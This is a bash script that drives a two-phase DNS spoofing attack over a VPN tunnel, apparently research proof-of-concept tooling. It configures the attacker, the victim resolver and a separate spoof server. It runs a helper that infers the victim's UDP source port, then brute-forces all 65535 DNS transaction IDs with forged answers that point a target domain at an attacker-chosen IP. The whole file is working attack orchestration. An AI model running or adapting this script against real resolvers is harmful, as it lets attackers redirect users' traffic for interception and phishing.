# !/bin/bash
ATTACKER_PRIVATE_IP=10.7.110.43; # VPN private IP of the local attacker after connecting with the VPN server
REMOTE_DNS_IP=1.1.1.1; # IP of the victim's DNS resolver to target
REMOTE_DNS_PORT=53; # DNS service port
SPOOF_SERVER_IP=43.159.39.110; # Public IP of the spoof server
SPOOF_SERVER_PORT=8081; # HTTP control port exposed by the spoof server
PACKET_IFACE="tun0"; # Packet iface of the local attacker after connecting with the VPN server
TARGET_DOMAIN="demo.test"; # The queried domain name that will be forged
FORGED_IP="6.6.6.6"; # The malicious DNS answer injected into the victim flow
DNS_TTL=60; # TTL placed in the spoofed DNS answer
TXID_BEGIN=0; # Usually 0
TXID_END=65535; # Usually 65535

printf "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 1 ~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
echo `date`
echo "Make sure the victim has already issued the target DNS query and the legitimate resolver is delayed or muted."
echo "inferring if there is an active DNS session to ${REMOTE_DNS_IP}:${REMOTE_DNS_PORT}..."

cd ../1-infer_port
sudo ./udp_port_infer ${ATTACKER_PRIVATE_IP} ${REMOTE_DNS_IP} ${REMOTE_DNS_PORT} ${SPOOF_SERVER_IP} ${SPOOF_SERVER_PORT} ${PACKET_IFACE}

PORT_INFER_RESULT=$(cat ../complete_attack/PORT_INFER_RESULT)
GUESSED_CLIENT_PORT=$(echo "$PORT_INFER_RESULT" | grep -o "source-port: .*" | awk -F": " '{print $2}' | head -n 1)

echo "phase 1 port result: ${GUESSED_CLIENT_PORT}"
echo `date`

printf "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 2~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
echo `date`
echo "beginning phase 2 to brute-force DNS TxIDs with spoofed responses..."

cd ../2-inject_dns
./dns_txid_inject ${GUESSED_CLIENT_PORT} ${SPOOF_SERVER_IP} ${SPOOF_SERVER_PORT} ${TARGET_DOMAIN} ${FORGED_IP} ${DNS_TTL} ${TXID_BEGIN} ${TXID_END}

echo `date`
